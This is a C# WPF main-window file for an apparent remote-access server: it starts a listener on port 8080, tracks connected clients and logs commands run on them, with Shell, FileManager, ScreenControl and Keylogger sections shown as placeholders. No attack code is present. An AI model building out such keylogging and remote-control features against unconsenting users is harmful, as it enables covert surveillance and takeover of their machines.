using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Windows;
using System.Windows.Controls;
using RemoteAccessServer.Core;
using RemoteAccessServer.Models;

namespace RemoteAccessServer
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private RemoteAccessServer.Core.ServerManager _serverManager;
        private ObservableCollection<ClientInfo> _clients;
        private ObservableCollection<string> _recentActivity;

        public MainWindow()
        {
            _serverManager = new RemoteAccessServer.Core.ServerManager();
            _clients = new ObservableCollection<ClientInfo>();
            _recentActivity = new ObservableCollection<string>();
            InitializeComponent();
            InitializeComponents();
        }

        private void InitializeComponents()
        {
            // Bind data to UI elements
            ClientsDataGrid.ItemsSource = _clients;
            RecentActivityList.ItemsSource = _recentActivity;

            // Subscribe to server events
            _serverManager.ClientConnected += OnClientConnected;
            _serverManager.ClientDisconnected += OnClientDisconnected;
            _serverManager.ServerStarted += OnServerStarted;
            _serverManager.ServerStopped += OnServerStopped;
            _serverManager.CommandExecuted += OnCommandExecuted;

            // Add initial activity
            AddRecentActivity("Server initialized");
            UpdateUI();
        }

        private void NavigationButton_Click(object sender, RoutedEventArgs e)
        {
            if (sender is Button button && button.Tag is string section)
            {
                ShowSection(section);
            }
        }

        private void ShowSection(string section)
        {
            // Hide all views
            DashboardView.Visibility = Visibility.Collapsed;
            ClientsView.Visibility = Visibility.Collapsed;
            PlaceholderView.Visibility = Visibility.Collapsed;

            switch (section)
            {
                case "Dashboard":
                    DashboardView.Visibility = Visibility.Visible;
                    break;
                case "Clients":
                    ClientsView.Visibility = Visibility.Visible;
                    break;
                case "Shell":
                case "FileManager":
                case "ScreenControl":
                case "Keylogger":
                case "Settings":
                case "About":
                    PlaceholderView.Text = $"{section} - Coming in future stages";
                    PlaceholderView.Visibility = Visibility.Visible;
                    break;
                default:
                    DashboardView.Visibility = Visibility.Visible;
                    break;
            }
        }

        private async void StartServer_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                await _serverManager.StartAsync(8080); // Default port
                AddRecentActivity("Server start initiated");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to start server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                Logger.LogError($"Failed to start server: {ex}");
            }
        }

        private async void StopServer_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                await _serverManager.StopAsync();
                AddRecentActivity("Server stop initiated");
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to stop server: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                Logger.LogError($"Failed to stop server: {ex}");
            }
        }

        private void OnClientConnected(object? sender, RemoteAccessServer.Core.ClientConnectedEventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                _clients.Add(e.Client);
                AddRecentActivity($"Client connected: {e.Client.IpAddress}");
                UpdateUI();
            });
        }

        private void OnClientDisconnected(object? sender, RemoteAccessServer.Models.ClientDisconnectedEventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                var client = _clients.FirstOrDefault(c => c.ClientId == e.ClientId);
                if (client != null)
                {
                    _clients.Remove(client);
                    AddRecentActivity($"Client disconnected: {client.IpAddress}");
                    UpdateUI();
                }
            });
        }

        private void OnServerStarted(object? sender, EventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                ServerStatusText.Text = "[Online]";
                ServerStatusText.Foreground = System.Windows.Media.Brushes.Green;
                StartServerBtn.IsEnabled = false;
                StopServerBtn.IsEnabled = true;
                ServerPortStatus.Text = $"Port: {_serverManager.Port}";
                AddRecentActivity("Server started successfully");
            });
        }

        private void OnServerStopped(object? sender, EventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                ServerStatusText.Text = "[Offline]";
                ServerStatusText.Foreground = System.Windows.Media.Brushes.Red;
                StartServerBtn.IsEnabled = true;
                StopServerBtn.IsEnabled = false;
                ServerPortStatus.Text = "Port: Not Set";
                _clients.Clear();
                AddRecentActivity("Server stopped");
                UpdateUI();
            });
        }

        private void OnCommandExecuted(object? sender, RemoteAccessServer.Models.CommandExecutedEventArgs e)
        {
            Dispatcher.Invoke(() =>
            {
                AddRecentActivity($"Command executed: {e.Command} on {e.ClientId}");
                // Update command count
                if (int.TryParse(CommandsSentCount.Text, out int count))
                {
                    CommandsSentCount.Text = (count + 1).ToString();
                }
            });
        }

        private void AddRecentActivity(string activity)
        {
            var timestamp = DateTime.Now.ToString("HH:mm:ss");
            _recentActivity.Insert(0, $"[{timestamp}] {activity}");
            
            // Keep only last 50 entries
            while (_recentActivity.Count > 50)
            {
                _recentActivity.RemoveAt(_recentActivity.Count - 1);
            }
        }

        private void UpdateUI()
        {
            ConnectedClientsCount.Text = _clients.Count.ToString();
            ClientCountStatus.Text = $"Clients: {_clients.Count}";
        }

        protected override void OnClosed(EventArgs e)
        {
            _serverManager?.Dispose();
            base.OnClosed(e);
        }
    }
}